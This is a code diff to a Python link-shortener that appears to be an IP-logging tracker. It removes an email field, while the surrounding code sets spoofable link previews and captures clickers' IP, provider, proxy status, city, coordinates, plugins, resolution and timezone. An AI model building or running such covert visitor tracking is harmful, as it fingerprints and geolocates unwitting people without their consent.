@@ -28,13 +28,12 @@ def init_db():
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
 
-    # ─── links table ─────────────────────────────────────────────────────────
+    # ─── links table (no more email column) ───────────────────────────────────
     c.execute("""
     CREATE TABLE IF NOT EXISTS links (
       id INTEGER PRIMARY KEY,
       code TEXT UNIQUE,
       target TEXT,
-      email TEXT,
       created_at TEXT,
       og_title TEXT,
       og_description TEXT,
@@ -112,7 +111,6 @@ async def create_link(
     request: Request,
     target_url: str = Form(...),
     shortener: str  = Form(...),
-    email: str      = Form(...),
 
     capture_ip: str        = Form(None),
     capture_host: str      = Form(None),
@@ -177,7 +175,7 @@ async def create_link(
       'capture_timezone':   bool(capture_timezone),
     }
 
-    # 4) insert link + flags
+    # 4) insert link + flags (no email)
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
     created_at = datetime.utcnow().isoformat()
@@ -189,21 +187,19 @@ async def create_link(
     try:
         c.execute(f"""
           INSERT INTO links
-            (code, target, email, created_at, og_title, og_description, og_image, {cols})
+            (code, target, created_at, og_title, og_description, og_image, {cols})
           VALUES
-            (?, ?, ?, ?, ?, ?, ?, {placeholders})
-        """, [code, target_url, email, created_at,
-              og_title, og_description, og_image, *vals])
+            (?, ?, ?, ?, ?, ?, {placeholders})
+        """, [code, target_url, created_at, og_title, og_description, og_image, *vals])
     except sqlite3.IntegrityError:
         # collision; try once more
         code = generate_code()
         c.execute(f"""
           INSERT INTO links
-            (code, target, email, created_at, og_title, og_description, og_image, {cols})
+            (code, target, created_at, og_title, og_description, og_image, {cols})
           VALUES
-            (?, ?, ?, ?, ?, ?, ?, {placeholders})
-        """, [code, target_url, email, created_at,
-              og_title, og_description, og_image, *vals])
+            (?, ?, ?, ?, ?, ?, {placeholders})
+        """, [code, target_url, created_at, og_title, og_description, og_image, *vals])
 
     conn.commit()
     conn.close()
@@ -333,14 +329,12 @@ async def redirect_to_target(
       "og_title":        og_title,
       "og_description":  og_description,
       "og_image":        og_image,
-
       "capture_flash":      cap_flash,
       "capture_java":       cap_java,
       "capture_plugins":    cap_plugins,
       "capture_resolution": cap_resolution,
       "capture_localtime":  cap_localtime,
       "capture_timezone":   cap_timezone,
-
       "code": code
     })
 
@@ -384,7 +378,7 @@ async def collect_data(request: Request):
 async def track(request: Request, code: str):
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    # find the numeric link_id
+
     c.execute("SELECT id FROM links WHERE code=?", (code,))
     row = c.fetchone()
     if not row:
@@ -392,7 +386,6 @@ async def track(request: Request, code: str):
         raise HTTPException(404, "Link not found")
     link_id = row[0]
 
-    # ← select every single column (in the order your INSERT used)
     c.execute("""
       SELECT
         ip, host, provider, proxy, continent, country, region, city, latlong,
